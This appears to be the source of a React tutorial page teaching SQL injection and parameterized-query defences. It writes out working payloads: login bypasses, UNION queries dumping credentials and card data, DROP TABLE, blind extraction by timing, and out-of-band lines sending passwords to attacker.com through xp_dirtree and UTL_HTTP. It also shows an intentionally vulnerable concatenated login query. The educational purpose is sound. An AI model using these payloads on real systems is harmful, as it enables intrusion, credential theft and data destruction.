              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                A Detailed Example: The Login Form
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Let's look at a concrete example. Imagine a simple login page where users enter their email and password.
                Here's what happens behind the scenes when a developer writes insecure code:
              </Typography>

              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
                The Vulnerable Application Code:
              </Typography>
              <CodeBlock
                language="javascript"
                title="INSECURE: How NOT to build a login query"
                code={`// The user submitted these values from the login form:
const email = req.body.email;      // Whatever the user typed
const password = req.body.password; // Whatever the user typed

// DANGER: The developer builds the query by concatenating strings
const query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";

// This query is sent to the database
db.query(query);`}
              />

              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
                When a legitimate user enters their email <code>alice@example.com</code> and password <code>mypassword</code>,
                the query becomes:
              </Typography>

              <CodeBlock
                language="sql"
                title="Normal login - what should happen"
                code={`SELECT * FROM users WHERE email = 'alice@example.com' AND password = 'mypassword'

-- This query says: "Find me a user where BOTH the email matches AND the password matches"
-- If both are correct, the user is logged in. If not, login fails. This is expected behavior.`}
              />

              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
                But what if an attacker enters <code>' OR '1'='1' --</code> as the email? Let's trace through what happens:
              </Typography>

              <CodeBlock
                language="sql"
                title="Attack input - how the injection works"
                code={`-- The attacker enters this as the email field:
' OR '1'='1' --

-- The password field can be anything (or empty)

-- After concatenation, the query becomes:
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'whatever'

-- Let's break this down:
-- email = ''         → This part is false (empty string doesn't match)
-- OR '1'='1'         → This is ALWAYS true (1 always equals 1)
-- --                 → This is a SQL comment, everything after is ignored!

-- So the query effectively becomes:
SELECT * FROM users WHERE (false) OR (true)
-- Which simplifies to:
SELECT * FROM users WHERE true
-- This returns ALL users in the database!`}
              />

              <Alert severity="error" sx={{ my: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>What Just Happened?</AlertTitle>
                <Typography variant="body2" sx={{ mb: 1 }}>
                  The attacker used special characters to <strong>break out</strong> of the intended query structure:
                </Typography>
                <List dense>
                  <ListItem><ListItemText primary="The single quote (') closed the email string early" /></ListItem>
                  <ListItem><ListItemText primary="OR '1'='1' added a condition that's always true" /></ListItem>
                  <ListItem><ListItemText primary="The double dash (--) commented out the rest of the query" /></ListItem>
                </List>
                <Typography variant="body2">
                  The database received what looked like a valid SQL command and executed it. It has no way to know that
                  part of the command came from an attacker rather than the application.
                </Typography>
              </Alert>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: "#22c55e" }}>
                The Secure Way: Parameterized Queries
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Now let's see how to write this correctly. With parameterized queries (also called prepared statements),
                you separate the SQL structure from the data. The database receives them separately and knows which is which.
              </Typography>

              <CodeBlock
                language="javascript"
                title="SECURE: Using parameterized queries"
                code={`// The user submitted these values:
const email = req.body.email;
const password = req.body.password;

// SECURE: Use placeholders (?) for user data
const query = "SELECT * FROM users WHERE email = ? AND password = ?";

// Pass the data separately - the database knows these are DATA, not CODE
db.query(query, [email, password]);

// Even if someone enters ' OR '1'='1' -- as the email,
// the database will search for a user with that LITERAL email address
// (which doesn't exist), not execute it as SQL code.`}
              />

              <Typography variant="body1" sx={{ mb: 2, mt: 3, lineHeight: 1.8 }}>
                With parameterized queries, here's what the database actually does:
              </Typography>

              <Grid container spacing={2} sx={{ mb: 3 }}>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>1. Parse Structure First</Typography>
                    <Typography variant="body2">
                      The database parses "SELECT * FROM users WHERE email = ? AND password = ?" and understands the query structure
                      before seeing any data.
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>2. Receive Data Separately</Typography>
                    <Typography variant="body2">
                      The email and password values are sent separately. The database knows these go into the placeholders as
                      literal data values.
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>3. Safe Execution</Typography>
                    <Typography variant="body2">
                      No matter what characters are in the data, they cannot change the query structure. Single quotes, dashes,
                      and SQL keywords are treated as literal text.
                    </Typography>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                Other Common SQL Injection Patterns
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                The login bypass is just one example. Attackers use many different techniques depending on what they're trying to achieve:
              </Typography>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>Data Extraction with UNION</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2 }}>
                    The UNION command combines results from two queries. Attackers use it to append their own query and extract
                    data from other tables:
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- Original query looking for products:
SELECT name, price FROM products WHERE id = 1

-- Attacker input: 1 UNION SELECT username, password FROM users--
-- Resulting query:
SELECT name, price FROM products WHERE id = 1 UNION SELECT username, password FROM users--

-- This returns product info PLUS all usernames and passwords!`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>Data Modification with Stacked Queries</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2 }}>
                    Some databases allow multiple statements separated by semicolons. Attackers can add their own destructive commands:
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- Original query:
SELECT * FROM products WHERE id = 1

-- Attacker input: 1; DROP TABLE users;--
-- Resulting queries:
SELECT * FROM products WHERE id = 1; DROP TABLE users;--

-- This runs the original query, then DELETES the entire users table!`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>Information Gathering with Errors</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2 }}>
                    Even error messages can leak valuable information. Attackers intentionally cause errors to learn about the database:
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- Attacker causes an error by using an invalid conversion:
SELECT * FROM products WHERE id = CONVERT(int, @@version)

-- Error message reveals:
-- "Conversion failed when converting the nvarchar value
-- 'Microsoft SQL Server 2019...' to data type int"

-- Now the attacker knows the exact database version!`}
                  />
                </AccordionDetails>
              </Accordion>

              <Alert severity="info" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Key Takeaways</AlertTitle>
                <List dense>
                  <ListItem><ListItemText primary="SQL injection happens when user input becomes part of the SQL command structure" /></ListItem>
                  <ListItem><ListItemText primary="The database can't tell the difference between developer code and injected attacker code" /></ListItem>
                  <ListItem><ListItemText primary="Parameterized queries keep code and data completely separate - this is the fix" /></ListItem>
                  <ListItem><ListItemText primary="Never build SQL by concatenating strings with user input" /></ListItem>
                </List>
              </Alert>
            </Paper>

            {/* ========== SECTION: SQLI TYPES ========== */}
            <Paper
              id="sqli-types"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: accent }} />
                SQL Injection Types
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Not all SQL injection attacks work the same way. Depending on how the application responds (or doesn't respond)
                to injected SQL, attackers use different techniques to extract information or confirm the vulnerability exists.
                Understanding these types is important for both testing applications and defending them.
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                The main categories are based on <strong>how the attacker receives feedback</strong>. In some cases, the application
                shows database results or errors directly (in-band). In other cases, the attacker must infer information from
                indirect signals like timing delays or response differences (blind/inferential). Let's explore each type:
              </Typography>

              {/* Classification Overview */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  How SQLi Types are Classified
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>In-Band (Classic)</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Results come back through the same channel as the attack. The attacker can see query results or error messages
                      directly in the application's response. This is the easiest to exploit.
                    </Typography>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Blind (Inferential)</Typography>
                    <Typography variant="body2" color="text.secondary">
                      No direct output is visible. The attacker must infer information through indirect signals: response time differences,
                      content changes, or HTTP status codes. Slower but still dangerous.
                    </Typography>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Out-of-Band</Typography>
                    <Typography variant="body2" color="text.secondary">
                      Data is exfiltrated through a different channel entirely - like DNS requests or HTTP calls from the database
                      server to an attacker-controlled system. Used when other methods fail.
                    </Typography>
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: accent }}>
                The Six Main Types of SQL Injection
              </Typography>

              <Grid container spacing={3}>
                {sqliTypes.map((type) => (
                  <Grid item xs={12} md={6} key={type.type}>
                    <Paper
                      sx={{
                        p: 3,
                        borderRadius: 3,
                        height: "100%",
                        borderLeft: `4px solid ${type.color}`,
                        bgcolor: alpha(type.color, 0.03),
                      }}
                    >
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 1, color: type.color }}>
                        {type.type}
                      </Typography>
                      <Typography variant="body2" sx={{ mb: 2 }}>{type.description}</Typography>
                      <Box sx={{ mb: 1 }}>
                        <Typography variant="caption" sx={{ fontWeight: 700, color: "text.secondary" }}>SIGNALS:</Typography>
                        <Typography variant="body2" color="text.secondary">{type.signals}</Typography>
                      </Box>
                      <Box>
                        <Typography variant="caption" sx={{ fontWeight: 700, color: "text.secondary" }}>RISK:</Typography>
                        <Typography variant="body2" color="text.secondary">{type.risk}</Typography>
                      </Box>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              {/* Detailed explanations for each type */}
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                Understanding Each Type in Detail
              </Typography>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#ef4444", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#ef4444" }}>Error-Based SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Error-based SQLi is often the <strong>first type discovered</strong> during testing because it's so visible.
                    When an application displays database error messages to users, attackers can intentionally cause errors that
                    reveal information about the database structure, table names, or even actual data.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker crafts input that causes a SQL syntax error or type conversion error.
                    The error message often contains the original query, table names, column names, or data values. Even a simple
                    "You have an error in your SQL syntax" reveals the application is vulnerable.
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- Attacker enters a single quote to break the query:
Input: '

-- This might produce an error like:
-- "You have an error in your SQL syntax; check the manual near ''' at line 1"

-- More advanced: Force an error that reveals data
-- In SQL Server, this extracts the username through an error:
Input: ' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--

-- Error: "Conversion failed when converting the nvarchar value 'admin' to int"
-- The attacker now knows there's a user called 'admin'!`}
                  />
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      <strong>Defense tip:</strong> Never display raw database errors to users. Log them server-side and show
                      generic error messages like "An error occurred. Please try again."
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#f97316", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#f97316" }}>Union-Based SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    UNION-based SQLi is one of the most powerful techniques when the application displays query results.
                    The SQL <code>UNION</code> operator combines results from multiple SELECT statements, allowing attackers
                    to append their own query and have its results appear in the application's output.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker first determines how many columns the original query returns
                    (they must match). Then they craft a UNION SELECT that retrieves data from other tables, which appears
                    alongside the legitimate results.
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- Original query (retrieving products):
SELECT name, description, price FROM products WHERE category = 'electronics'

-- Step 1: Determine the number of columns
-- Try adding NULLs until no error:
' UNION SELECT NULL--           -- Error (wrong column count)
' UNION SELECT NULL,NULL--      -- Error (wrong column count)
' UNION SELECT NULL,NULL,NULL-- -- Success! Query has 3 columns

-- Step 2: Find which columns display text
' UNION SELECT 'a','b','c'--    -- See which positions show 'a', 'b', or 'c'

-- Step 3: Extract sensitive data
' UNION SELECT username, password, email FROM users--

-- The user credentials now appear as "products" in the page!`}
                  />
                  <Alert severity="warning" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      <strong>Key requirement:</strong> UNION attacks require the same number of columns with compatible
                      data types. Attackers typically use NULL (which is compatible with any type) to probe.
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#eab308", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#eab308" }}>Boolean-Based Blind SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    When an application doesn't show query results or errors, attackers use "blind" techniques. Boolean-based
                    blind SQLi works by asking the database yes/no questions and observing how the response changes.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker injects conditions that are either true or false. If the application
                    behaves differently (different content, different page, different status code), the attacker can infer
                    information one bit at a time.
                  </Typography>
                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#eab308", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Extracting a Password Character by Character</Typography>
                    <CodeBlock
                      language="sql"
                      code={`-- Assume a product page: /product?id=1
-- Normal response shows the product. Let's extract the admin password.

-- Step 1: Confirm injection works
/product?id=1 AND 1=1    -- Response: Product shows (TRUE condition)
/product?id=1 AND 1=2    -- Response: Product missing (FALSE condition)
-- Different responses confirm we can inject boolean conditions!

-- Step 2: Ask questions about the password
/product?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
-- If product shows → first character is 'a'
-- If product missing → first character is NOT 'a'

-- Step 3: Try each character until we find it
...='a'  -- Missing (false)
...='b'  -- Missing (false)
...='p'  -- Shows! First character is 'p'

-- Step 4: Move to next character
/product?id=1 AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a'
-- Repeat for each position...

-- Eventually we extract: "password123" (very slow, but works!)`}
                    />
                  </Paper>
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      This technique is slow (one character at a time, with ~30-100 requests per character) but reliable.
                      Automated tools like SQLMap make this practical.
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#22c55e", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#22c55e" }}>Time-Based Blind SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    When even the response content doesn't change, attackers can use timing. Time-based blind SQLi makes the
                    database wait before responding. If the response is delayed, the attacker knows their condition was true.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker injects a conditional time delay (like SLEEP or WAITFOR).
                    If the condition is true, the database waits. If false, it responds immediately. The attacker measures
                    response times to infer information.
                  </Typography>
                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Confirming Vulnerability with Timing</Typography>
                    <CodeBlock
                      language="sql"
                      code={`-- Test if the application is vulnerable:
/product?id=1; WAITFOR DELAY '0:0:5'--     -- MSSQL
/product?id=1 AND SLEEP(5)--                -- MySQL

-- If the response takes 5 seconds longer than normal, SQLi is confirmed!

-- Extracting data with timing:
-- "If the first character of the admin password is 'a', wait 5 seconds"
/product?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--

-- Response time: 200ms → Not 'a'
-- Response time: 200ms → Not 'b'
-- ...
-- Response time: 5200ms → It's 'p'!

-- Move to next character and repeat...`}
                    />
                  </Paper>
                  <Alert severity="warning" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      Time-based attacks are very slow and can be affected by network latency. Attackers typically use shorter
                      delays (1-2 seconds) and statistical analysis to account for variable response times.
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#3b82f6", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#3b82f6" }}>Out-of-Band SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Out-of-band (OOB) SQLi uses a completely different channel to exfiltrate data. Instead of reading results
                    from the HTTP response, the attacker makes the database server send data to an external system they control.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker injects SQL that makes the database perform a DNS lookup or
                    HTTP request containing the stolen data. The attacker monitors their own server to receive the data.
                  </Typography>
                  <CodeBlock
                    language="sql"
                    code={`-- DNS exfiltration (MSSQL):
-- Make the database resolve a DNS name that includes stolen data
'; EXEC master..xp_dirtree '\\\\'+password+'.attacker.com\\share'--

-- The attacker's DNS server receives a lookup for:
-- "secretpassword123.attacker.com"
-- They just extracted the password through DNS!

-- HTTP exfiltration (Oracle):
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users WHERE username='admin'

-- The attacker's web server logs:
-- GET /secretpassword123 HTTP/1.1
-- They captured the password in their access logs!`}
                  />
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      OOB attacks require the database server to have outbound network access (which it often shouldn't).
                      This technique works when in-band and blind methods fail, or when responses aren't reliable.
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha("#8b5cf6", 0.05) }}>
                  <Typography sx={{ fontWeight: 700, color: "#8b5cf6" }}>Second-Order SQL Injection</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Second-order (or stored) SQLi is sneaky because the attack doesn't trigger immediately. Malicious input
                    is stored in the database first, then later retrieved and used in a vulnerable query elsewhere.
                  </Typography>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    <strong>How it works:</strong> The attacker stores malicious SQL as data (e.g., in their username).
                    Later, when an admin views users or the system processes that data, the stored SQL gets executed.
                  </Typography>
                  <Paper sx={{ p: 3, mb: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2 }}>Example: Malicious Username</Typography>
                    <CodeBlock
                      language="sql"
                      code={`-- Step 1: Attacker registers with a malicious username
-- The registration form safely escapes input, so no immediate attack:
Username: admin'--
Password: anything

-- The username is stored safely in the database as literal text:
INSERT INTO users (username, password) VALUES ('admin''--', 'hashed_password')
-- (Single quotes are escaped to '', so no injection here)

-- Step 2: Later, an admin views the user list
-- The application retrieves the username and uses it in another query:
SELECT * FROM audit_log WHERE username = '[username_variable]'

-- If this second query doesn't use parameters, it becomes:
SELECT * FROM audit_log WHERE username = 'admin'--'
-- The -- comments out the rest, and the attacker sees admin's logs!

-- Or worse, for password reset:
UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
-- This resets the REAL admin's password!`}
                    />
                  </Paper>
                  <Alert severity="error" sx={{ mt: 2 }}>
                    <Typography variant="body2">
                      <strong>Critical lesson:</strong> Don't assume data from your own database is safe! If it originally came
                      from a user, it must be parameterized every time it's used in a query, even internally.
                    </Typography>
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Alert severity="success" sx={{ mt: 3, borderRadius: 2 }}>
                <AlertTitle sx={{ fontWeight: 700 }}>Key Insight for Defenders</AlertTitle>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  All these attack types exploit the same root cause: <strong>user input becoming part of SQL code</strong>.
                  The defense is the same regardless of attack type: use parameterized queries everywhere. Don't try to detect
                  or filter attack patterns - properly separate code from data, and none of these techniques will work.
                </Typography>
              </Alert>
            </Paper>

            {/* ========== SECTION: ENTRY POINTS ========== */}
            <Paper
              id="entry-points"
              sx={{
                p: 4,
                mb: 5,
                borderRadius: 4,
                bgcolor: alpha(theme.palette.background.paper, 0.6),
                border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
                scrollMarginTop: 96,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <ApiIcon sx={{ color: accent }} />
                Common Entry Points
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                SQL injection can occur anywhere user-controlled data flows into a database query. Understanding where
                to look for vulnerabilities is crucial for both testers and developers. The key question is: <strong>
                "Does any user input reach a SQL query?"</strong> If yes, that's a potential entry point.
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                Entry points aren't just obvious form fields. Attackers think creatively about all the ways data enters
                an application. Let's explore the most common and often-overlooked attack surfaces:
              </Typography>

              {/* Analogy Box */}
              <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                  Think Like a Detective
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Imagine every piece of data that enters your application as a potential carrier of malicious SQL.
                  This includes the obvious (form fields, search boxes) but also the subtle (HTTP headers your app logs,
                  filenames from uploads, data imported from spreadsheets). If it touches a database query, it needs protection.
                </Typography>
              </Paper>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>High-Risk Entry Points</Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      These are the most commonly exploited locations. Test these first:
                    </Typography>
                    <List dense>
                      {[
                        { text: "Login and authentication forms", desc: "Username and password fields directly query the users table" },
                        { text: "Search boxes and filters", desc: "User input often becomes part of WHERE clauses" },
                        { text: "URL query parameters (?id=1, ?sort=name)", desc: "Visible in the browser address bar, easy to manipulate" },
                        { text: "POST body parameters (forms, JSON)", desc: "Hidden from URL but still sent to the server" },
                        { text: "HTTP headers (User-Agent, Referer, X-Forwarded-For)", desc: "Often logged or processed without sanitization" },
                        { text: "Cookies (session identifiers, preferences)", desc: "Stored on client, can be modified by attackers" },
                      ].map((item, idx) => (
                        <ListItem key={idx} sx={{ flexDirection: "column", alignItems: "flex-start" }}>
                          <Box sx={{ display: "flex", alignItems: "center", width: "100%" }}>
                            <ListItemIcon sx={{ minWidth: 32 }}><WarningIcon sx={{ color: "#ef4444" }} fontSize="small" /></ListItemIcon>
                            <ListItemText primary={item.text} primaryTypographyProps={{ fontWeight: 600 }} />
                          </Box>
                          <Typography variant="caption" color="text.secondary" sx={{ pl: 4 }}>{item.desc}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>Often Overlooked Vectors</Typography>
                    <Typography variant="body2" sx={{ mb: 2, color: "text.secondary" }}>
                      These are frequently missed during security reviews:
                    </Typography>
                    <List dense>
                      {[
                        { text: "File upload names and metadata", desc: "Filename might be stored in database and queried later" },
                        { text: "CSV/Excel import fields", desc: "Bulk imports often skip input validation" },
                        { text: "API endpoints with complex filters", desc: "Rich query languages like OData or GraphQL can be abused" },
                        { text: "GraphQL arguments", desc: "Flexible query structure can hide injection points" },
                        { text: "Admin panels and internal tools", desc: "Often built quickly without security focus" },
                        { text: "Report builders with custom queries", desc: "User-defined filters may directly become SQL" },
                      ].map((item, idx) => (
                        <ListItem key={idx} sx={{ flexDirection: "column", alignItems: "flex-start" }}>
                          <Box sx={{ display: "flex", alignItems: "center", width: "100%" }}>
                            <ListItemIcon sx={{ minWidth: 32 }}><VisibilityIcon sx={{ color: "#f59e0b" }} fontSize="small" /></ListItemIcon>
                            <ListItemText primary={item.text} primaryTypographyProps={{ fontWeight: 600 }} />
                          </Box>
                          <Typography variant="caption" color="text.secondary" sx={{ pl: 4 }}>{item.desc}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Paper>
                </Grid>
              </Grid>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, mt: 4, color: accent }}>
                Real-World Entry Point Examples
              </Typography>

              <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
                Let's look at specific examples of how each entry point might be vulnerable:
              </Typography>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>URL Parameters (GET Requests)</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    URL parameters are the most visible entry point. When you see a URL like <code>/product?id=123</code>,
                    that <code>id</code> parameter likely goes into a database query. Attackers simply modify the URL in their browser.
                  </Typography>
                  <CodeBlock
                    language="text"
                    code={`Original URL:
https://shop.example.com/product?id=123

Attack URL:
https://shop.example.com/product?id=123' OR '1'='1'--

Other variations to try:
?id=123; DROP TABLE products--
?id=123 UNION SELECT username,password FROM users--
?category=electronics' AND 1=1--`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ mb: 1, borderRadius: "8px !important", "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />} sx={{ background: alpha(accent, 0.05) }}>
                  <Typography sx={{ fontWeight: 600 }}>Form Fields (POST Requests)</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ mb: 2, lineHeight: 1.7 }}>
                    Login forms, registration forms, contact forms, and search boxes all send POST data. While not visible
                    in the URL, attackers can easily modify these using browser developer tools or tools like Burp Suite.
                  </Typography>
                  <CodeBlock
                    language="text"
                    code={`Login Form Attack:
Username: admin'--
Password: anything
(This might comment out the password check)

Search Form Attack:
Search: laptop' UNION SELECT credit_card, cvv, expiry FROM payments--
(This might return payment data instead of products)

